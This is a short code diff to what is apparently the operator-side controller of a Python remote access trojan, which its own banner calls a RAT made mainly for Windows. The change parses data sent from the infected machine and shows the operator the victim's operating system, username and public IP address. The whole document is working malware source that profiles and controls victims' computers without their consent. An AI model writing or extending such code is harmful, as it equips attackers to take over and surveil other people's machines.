@@ -3,6 +3,7 @@ import subprocess
 import sys
 import re
 import colorama
+import json
 
 
 def imports():
@@ -61,7 +62,10 @@ def login():
 
             print(bcolors.GREEN + logsuc)
             print(bcolors.YELLOW + 'Please Type HELP to know all custom commands')
-            os = str(conn.recv(1024), "utf-8")
+            client_info = json.loads(str(conn.recv(1024), "utf-8"))
+            client_username = client_info[1]
+            os = client_info[0]
+            client_ip = client_info[2]
             if "win" in os:
                 os = "WINDOWS MACHINE"
             elif "mac" in os:
@@ -70,9 +74,10 @@ def login():
                 os = "LINUX MACHINE"
             elif "ub" in os:
                 os = "UBUNTU MACHINE"
-            print(bcolors.RED + "########## WARNING!!!! THIS RAT IS MADE FOR WINDOWS SO SOME OF THE CUSTOM COMMANDS MAY NOT WORK ON OTHER OS ##########")
+            print(bcolors.RED + "########## WARNING!!!! THIS RAT IS MADE FOR MAINLY WINDOWS SO SOME OF THE CUSTOM COMMANDS MAY NOT WORK ON OTHER OS ##########")
             print(bcolors.YELLOW + "----------------------------------------------------------------------------------------------------------------------")
             print(bcolors.RED + "########## YOUR CLIENT IS USING A " + os + " SO MAKE SURE TO USE COMMANDS THAT WORK ON " + os + " ##########")
+            print(bcolors.YELLOW + "\nThe username of the client computer is " + client_username + " and their public IP is " + client_ip)
             break
         elif lr != logsuc:
             print(bcolors.RED + logfail)
